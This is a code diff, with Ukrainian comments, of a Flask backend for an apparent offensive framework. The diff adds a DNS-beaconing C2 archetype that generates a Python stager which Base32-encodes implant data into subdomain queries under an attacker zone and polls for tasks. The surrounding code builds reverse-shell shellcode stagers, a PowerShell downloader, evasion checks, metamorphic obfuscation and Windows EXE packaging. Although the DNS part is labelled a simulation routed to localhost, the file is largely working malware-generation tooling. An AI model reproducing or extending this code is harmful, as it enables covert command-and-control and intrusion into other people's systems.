@@ -1,9 +1,10 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.8.2
-# Призначення: Backend на Flask з розширеним парсингом XML-виводу nmap (OS, CPE).
-# Оновлення v1.8.2:
-#   - Розширено parse_nmap_xml_output_for_services для вилучення OS (osmatch) та CPE сервісів.
-#   - perform_nmap_scan_be тепер гарантує використання -sV та -O з -oX для CVE-пошуку.
-#   - Оновлено /api/run_recon для повернення розширеної інформації (OS, CPE).
+# Syntax Flask Backend - Segment SFB-CORE-1.8.3
+# Призначення: Backend на Flask з концептуальною симуляцією DNS C2-каналу.
+# Оновлення v1.8.3:
+#   - Додано новий архетип пейлоада: 'dns_beacon_c2_concept'.
+#   - Додано параметри 'c2_dns_zone', 'dns_beacon_subdomain_prefix'.
+#   - Реалізовано логіку стейджера для симуляції DNS-маячків.
+#   - Додано концептуальний ендпоінт /api/c2/dns_resolver_sim для "обробки" DNS-запитів.
 #   - Оновлено логування.
 
 from flask import Flask, request, jsonify
@@ -25,12 +26,12 @@ import os
 import uuid 
 import shutil 
 
-VERSION_BACKEND = "1.8.2" # Оновлено версію
+VERSION_BACKEND = "1.8.3" # Оновлено версію
 
 simulated_implants_be = []
 pending_tasks_for_implants = {} 
 
-CONCEPTUAL_CVE_DATABASE_BE = {
+CONCEPTUAL_CVE_DATABASE_BE = { # Логіка (без змін від v1.8.2)
     "apache httpd 2.4.53": [{"cve_id": "CVE-2022-22721", "severity": "HIGH", "summary": "Apache HTTP Server 2.4.53 and earlier may not send the X-Frame-Options header..."}],
     "openssh 8.2p1": [{"cve_id": "CVE-2021-41617", "severity": "MEDIUM", "summary": "sshd in OpenSSH 6.2 through 8.8 allows remote attackers to bypass..."}],
     "vsftpd 3.0.3": [{"cve_id": "CVE-2015-1419", "severity": "CRITICAL", "summary": "vsftpd 3.0.3 and earlier allows remote attackers to cause a denial of service..."}],
@@ -63,7 +64,7 @@ def initialize_simulated_implants_be(): # Логіка (без змін)
     simulated_implants_be.sort(key=lambda x: x["id"])
     print(f"[C2_SIM_INFO] Ініціалізовано/Оновлено {len(simulated_implants_be)} імітованих імплантів. Чергу завдань очищено.")
 
-CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.8.1)
+CONCEPTUAL_PARAMS_SCHEMA_BE = {
     "payload_archetype": {
         "type": str, "required": True,
         "allowed_values": [
@@ -72,12 +73,13 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.8.1)
             "demo_c2_beacon_payload", 
             "reverse_shell_tcp_shellcode_windows_x64",
             "reverse_shell_tcp_shellcode_linux_x64",
-            "powershell_downloader_stager"
+            "powershell_downloader_stager",
+            "dns_beacon_c2_concept" # Новий архетип
         ]
     },
     "message_to_echo": {"type": str, "required": lambda params: params.get("payload_archetype") == "demo_echo_payload", "min_length": 1},
     "directory_to_list": {"type": str, "required": lambda params: params.get("payload_archetype") == "demo_file_lister_payload", "default": "."},
-    "c2_target_host": {
+    "c2_target_host": { # LHOST для шеллкодів
         "type": str,
         "required": lambda params: params.get("payload_archetype") in [
             "reverse_shell_tcp_shellcode_windows_x64",
@@ -85,7 +87,7 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.8.1)
         ],
         "validation_regex": r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$|^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$"
     },
-    "c2_target_port": {
+    "c2_target_port": { # LPORT для шеллкодів
         "type": int,
         "required": lambda params: params.get("payload_archetype") in [
             "reverse_shell_tcp_shellcode_windows_x64",
@@ -93,11 +95,23 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.8.1)
         ],
         "allowed_range": (1, 65535)
     },
-    "c2_beacon_endpoint": {
+    "c2_beacon_endpoint": { # URL для HTTP C2
         "type": str,
         "required": lambda params: params.get("payload_archetype") == "demo_c2_beacon_payload",
         "default": "http://localhost:5000/api/c2/beacon_receiver",
         "validation_regex": r"^(http|https)://[a-zA-Z0-9\-\.]+(:\d+)?(?:/[^/?#]*)?(?:\?[^#]*)?(?:#.*)?$"
+    },
+    "c2_dns_zone": { # Новий параметр для DNS C2
+        "type": str,
+        "required": lambda params: params.get("payload_archetype") == "dns_beacon_c2_concept",
+        "default": "syntax-c2.net",
+        "validation_regex": r"^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$"
+    },
+    "dns_beacon_subdomain_prefix": { # Новий параметр для DNS C2
+        "type": str,
+        "required": lambda params: params.get("payload_archetype") == "dns_beacon_c2_concept",
+        "default": "api",
+        "validation_regex": r"^[a-zA-Z0-9][a-zA-Z0-9\-]*$"
     },
     "shellcode_hex_placeholder": {
         "type": str,
@@ -146,6 +160,10 @@ CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = {
     "powershell_downloader_stager": {
         "description": "Windows PowerShell Downloader (Завантажує та виконує PS1 з URL)",
         "template_type": "python_stager_powershell_downloader"
+    },
+    "dns_beacon_c2_concept": { # Новий архетип
+        "description": "Концептуальний C2-маячок через DNS (симуляція)",
+        "template_type": "python_stager_dns_c2_beacon"
     }
 }
 
@@ -677,6 +695,12 @@ def handle_generate_payload():
             data_to_obfuscate_or_patch = patch_shellcode_be(shellcode_hex_input, lhost_for_patch, lport_for_patch, log_messages)
         elif archetype_name == "powershell_downloader_stager":
             data_to_obfuscate_or_patch = validated_params.get("powershell_script_url")
+        elif archetype_name == "dns_beacon_c2_concept":
+            # Для DNS C2, обфускуємо комбінацію зони та префікса, або передаємо їх окремо
+            # Поки що, для простоти, припустимо, що основні дані для обфускації - це сама зона.
+            # Реальна логіка кодування даних в DNS запити буде в стейджері.
+            data_to_obfuscate_or_patch = validated_params.get("c2_dns_zone")
+
 
         key = validated_params.get("obfuscation_key", "DefaultFrameworkKey")
         log_messages.append(f"[BACKEND_OBF_INFO] Обфускація даних ('{str(data_to_obfuscate_or_patch)[:30]}...') з ключем '{key}'.")
@@ -702,9 +726,15 @@ def handle_generate_payload():
             stager_implant_id = f"STGIMPLNT-{random.randint(100,999)}" 
             stager_code_lines.append(f"STAGER_IMPLANT_ID = \"{stager_implant_id}\"")
             stager_code_lines.append(f"BEACON_INTERVAL_SEC = {random.randint(10, 25)}") 
+        elif archetype_name == "dns_beacon_c2_concept":
+            stager_implant_id = f"DNSIMPLNT-{random.randint(100,999)}"
+            stager_code_lines.append(f"STAGER_IMPLANT_ID = \"{stager_implant_id}\"")
+            stager_code_lines.append(f"C2_DNS_ZONE = \"{validated_params.get('c2_dns_zone')}\"") # Передаємо зону в стейджер
+            stager_code_lines.append(f"DNS_BEACON_SUBDOMAIN_PREFIX = \"{validated_params.get('dns_beacon_subdomain_prefix')}\"")
+            stager_code_lines.append(f"DNS_BEACON_INTERVAL_SEC = {random.randint(25, 55)}") # Інтервал для DNS маячків
 
         stager_code_lines.extend(["", "import base64", "import os", "import time", "import random", "import string", "import subprocess", "import socket"])
-        if archetype_name == "demo_c2_beacon_payload":
+        if archetype_name == "demo_c2_beacon_payload" or archetype_name == "dns_beacon_c2_concept": # dns_beacon теж може використовувати json для завдань
             stager_code_lines.extend(["import urllib.request", "import urllib.error", "import json as json_module"]) 
 
         if archetype_name in ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64"] or validated_params.get('enable_evasion_checks'):
@@ -793,9 +823,9 @@ def handle_generate_payload():
             "    print(\"[STAGER_EVASION] Перевірки ухилення пройдені (концептуально).\")",
             "    return False",
             "",
-            f"def {execute_func_name_runtime}(content, arch_type):", # Логіка (без змін від v1.7.6)
+            f"def {execute_func_name_runtime}(content, arch_type):",
             "    print(f\"[PAYLOAD ({{arch_type}})] Ініціалізація логіки пейлоада з контентом (перші 30 байт): '{{str(content)[:30}}}...'\")",
-            "    if arch_type == 'demo_c2_beacon_payload':", 
+            "    if arch_type == 'demo_c2_beacon_payload':", # Логіка (без змін від v1.7.6)
             "        beacon_url = content", 
             "        implant_data = {",
             "            'implant_id': STAGER_IMPLANT_ID,",
@@ -873,6 +903,70 @@ def handle_generate_payload():
             "            ",
             "            print(f\"[PAYLOAD_BEACON] Очікування {{BEACON_INTERVAL_SEC}} секунд до наступного маячка...\")",
             "            time.sleep(BEACON_INTERVAL_SEC)",
+            "    elif arch_type == 'dns_beacon_c2_concept':", # Нова логіка для DNS C2
+            "        # 'content' тут - це розшифрована c2_dns_zone",
+            "        c2_zone = content",
+            "        dns_prefix = DNS_BEACON_SUBDOMAIN_PREFIX",
+            "        implant_id_dns = STAGER_IMPLANT_ID",
+            "        beacon_interval = DNS_BEACON_INTERVAL_SEC",
+            "        last_task_result_dns = None",
+            "",
+            "        def encode_data_for_dns(data_dict):",
+            "            # Просте кодування даних у Base32 без padding, безпечне для DNS",
+            "            # Обмежуємо довжину, щоб уникнути занадто довгих субдоменів",
+            "            try:",
+            "                json_data = json_module.dumps(data_dict, separators=(',', ':'))",
+            "                encoded_bytes = base64.b32encode(json_data.encode('utf-8'))",
+            "                return encoded_bytes.decode('utf-8').rstrip('=').lower()[:60] # Обмеження довжини",
+            "            except Exception as e_enc:",
+            "                print(f\"[DNS_BEACON_ERROR] Помилка кодування даних: {{e_enc}}\")",
+            "                return \"encodeerror\"",
+            "",
+            "        print(f\"[PAYLOAD_DNS_BEACON] Ініціалізація DNS C2. Зона: {{c2_zone}}, Префікс: {{dns_prefix}}, ID: {{implant_id_dns}}\")",
+            "        while True:",
+            "            beacon_data_to_send = {'id': implant_id_dns, 'status': 'beaconing'}",
+            "            if last_task_result_dns:",
+            "                beacon_data_to_send['last_task_id'] = last_task_result_dns.get('task_id')",
+            "                beacon_data_to_send['result'] = last_task_result_dns.get('result_summary', 'No summary')", # Короткий результат для DNS
+            "                last_task_result_dns = None",
+            "",
+            "            encoded_data_chunk = encode_data_for_dns(beacon_data_to_send)",
+            "            query_hostname = f\"{{encoded_data_chunk}}.{{implant_id_dns.lower().replace('-', '')[:10]}}.{{dns_prefix}}.{{c2_zone}}\"",
+            "            print(f\"[PAYLOAD_DNS_BEACON] Симуляція DNS-запиту для: {{query_hostname}}\")",
+            "            next_task_dns = None",
+            "            try:",
+            "                # Симуляція отримання завдання через DNS (наприклад, з TXT запису або спеціальної IP)",
+            "                # У реальному сценарії, тут був би виклик socket.gethostbyname або dns.resolver",
+            "                # Або, для двостороннього каналу, C2 сервер мав би контролювати DNS сервер зони.",
+            "                # Зараз ми симулюємо, що C2 сервер сам робить HTTP запит до себе, щоб отримати завдання.",
+            "                # Це дуже концептуально.",
+            "                # Формуємо URL для симуляції запиту до нашого ж backend'у",
+            "                sim_c2_dns_url = f'http://localhost:5000/api/c2/dns_resolver_sim?q={{query_hostname}}&id={{implant_id_dns}}'",
+            "                print(f\"[PAYLOAD_DNS_BEACON] Симуляція запиту до DNS Resolver (через HTTP): {{sim_c2_dns_url}}\")",
+            "                req = urllib.request.Request(sim_c2_dns_url, headers={'User-Agent': 'SyntaxDNSBeaconClient/1.0'})",
+            "                with urllib.request.urlopen(req, timeout=10) as response:",
+            "                    dns_response_raw = response.read().decode('utf-8')",
+            "                    print(f\"[PAYLOAD_DNS_BEACON] Відповідь від симулятора DNS Resolver: {{dns_response_raw[:200]}}...\")",
+            "                    dns_response_parsed = json_module.loads(dns_response_raw)",
+            "                    if dns_response_parsed.get('success'):",
+            "                        next_task_dns = dns_response_parsed.get('task_data')",
+            "",
+            "                if next_task_dns and next_task_dns.get('task_type'):",
+            "                    task_id = next_task_dns.get('task_id')",
+            "                    task_type = next_task_dns.get('task_type')",
+            "                    task_params_str = next_task_dns.get('task_params', '')",
+            "                    print(f\"[PAYLOAD_DNS_TASK] Отримано завдання (через DNS) ID: {{task_id}}, Тип: {{task_type}}, Парам: '{{task_params_str}}'\")",
+            "                    task_output = f'DNS_TASK_SIM_RESULT: {{task_type}} ({{task_params_str}}) - OK'",
+            "                    last_task_result_dns = {'task_id': task_id, 'result_summary': task_output[:50]} # Короткий результат для DNS",
+            "                    time.sleep(random.uniform(0.5, 1.0))",
+            "                else:",
+            "                    print(f\"[PAYLOAD_DNS_BEACON] Нових завдань через DNS не отримано.\")",
+            "                    last_task_result_dns = None",
+            "            except Exception as e_dns_beacon:",
+            "                print(f\"[PAYLOAD_DNS_BEACON_ERROR] Помилка в циклі DNS маячка: {{e_dns_beacon}}\")",
+            "            ",
+            "            print(f\"[PAYLOAD_DNS_BEACON] Очікування {{beacon_interval}} секунд до наступного DNS маячка...\")",
+            "            time.sleep(beacon_interval)",
 
             "    elif arch_type == 'demo_file_lister_payload':", # ... (без змін)
             "        try:",
@@ -983,7 +1077,7 @@ def handle_generate_payload():
         ])
         stager_code_raw = "\n".join(stager_code_lines)
 
-        if validated_params.get('enable_stager_metamorphism', False): 
+        if validated_params.get('enable_stager_metamorphism', False): # Логіка метаморфізму (без змін)
             log_messages.append("[BACKEND_METAMORPH_INFO] Застосування розширеного метаморфізму до Python-стейджера...")
             stager_code_raw_for_metamorph = stager_code_raw
             stager_code_raw_for_metamorph = obfuscate_string_literals_in_python_code(stager_code_raw_for_metamorph, key, log_messages)
@@ -1001,7 +1095,7 @@ def handle_generate_payload():
         output_format = validated_params.get("output_format")
         final_stager_output = ""
         
-        if output_format == "pyinstaller_exe_windows":
+        if output_format == "pyinstaller_exe_windows": # Логіка PyInstaller (без змін)
             log_messages.append("[BACKEND_PYINSTALLER_INFO] Обрано формат PyInstaller EXE.")
             pyinstaller_path = shutil.which("pyinstaller")
             if not pyinstaller_path:
